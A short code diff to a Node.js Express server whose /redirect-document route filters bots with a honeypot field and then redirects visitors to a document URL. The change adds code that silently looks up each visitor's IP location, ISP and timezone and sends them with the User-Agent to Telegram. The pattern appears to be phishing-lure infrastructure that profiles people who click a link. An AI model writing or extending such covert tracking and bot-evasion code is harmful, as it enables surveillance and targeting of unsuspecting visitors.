@@ -223,16 +223,32 @@ app.get('/', async (req, res) => {
 });
 
 // Document redirect with honeypot check
-app.get('/redirect-document', (req, res) => {
+app.get('/redirect-document', async (req, res) => {
   const honeypot = req.query.hp_field;
+  const clientIp = req.ip.replace('::ffff:', '');
+  const ua = req.get('User-Agent');
+
   if (honeypot && honeypot.trim() !== '') {
-    logLine(`HONEYPOT_TRIGGERED ip=${req.ip} ua="${req.get('User-Agent')}"`);
+    logLine(`HONEYPOT_TRIGGERED ip=${clientIp} ua="${ua}"`);
     return res.status(403).send('Access denied');
   }
 
-  logLine(`REDIRECT_DOCUMENT ip=${req.ip} ua="${req.get('User-Agent')}"`);
+  // ✅ Get IP info & send Telegram once
+  const ipInfo = await getIPInfo(clientIp);
+  await sendToTelegram(
+    clientIp,
+    ua,
+    ipInfo.country,
+    ipInfo.city,
+    ipInfo.isp,
+    ipInfo.timezone,
+    ipInfo.localTime
+  );
+
+  logLine(`REDIRECT_DOCUMENT ip=${clientIp} ua="${ua}"`);
   res.redirect(DOCUMENT_URL);
 });
+
 
 // Status endpoint
 app.get('/__status', (req, res) => {
